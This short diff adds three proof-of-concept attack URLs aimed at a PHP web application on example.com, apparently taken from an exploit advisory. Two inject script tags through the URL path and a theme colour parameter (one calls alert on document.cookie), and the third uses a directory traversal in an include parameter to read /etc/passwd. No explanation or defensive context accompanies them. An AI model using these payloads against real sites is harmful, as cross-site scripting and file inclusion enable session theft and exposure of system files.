@@ -1,0 +1,7 @@
+http://www.example.com/index.php/%27%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+
+
+http://www.example.com/themes/default/index.php?db_themes_background_color_page=%22%3E%3Cscript%3Ealert%28123%29;%3C/sc ript%3E
+
+
+http://www.example.com/index.php?page=login&amp;request=forgot_password&amp;include=../../../../../../../../etc/passwd
